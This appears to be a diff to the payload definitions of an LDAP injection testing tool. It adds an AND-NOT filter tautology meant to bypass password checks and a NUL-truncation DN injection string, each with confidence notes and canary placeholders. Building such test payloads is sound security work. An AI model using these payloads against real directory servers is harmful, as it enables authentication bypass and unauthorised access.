@@ -34,6 +34,14 @@ payloads:
     template: '('
     confidence: suspected
     notes: Unbalanced paren; provokes parser-error responses.
+  - id: filter_notpassword_bypass
+    template: 'admin)(!(userPassword={canary}))'
+    confidence: likely
+    notes: AND-NOT tautology bypass; matches any entry whose password differs from the {canary} literal.
+  - id: dn_inject_nul_truncate
+    template: 'cn={canary},dc=example,dc=com%00'
+    confidence: suspected
+    notes: NUL-truncation DN-injection variant for C-backed directory servers that terminate strings at NUL.
 mutations:
   - name: case_flip
     description: LDAP attribute names are case-insensitive — flips for filter research.
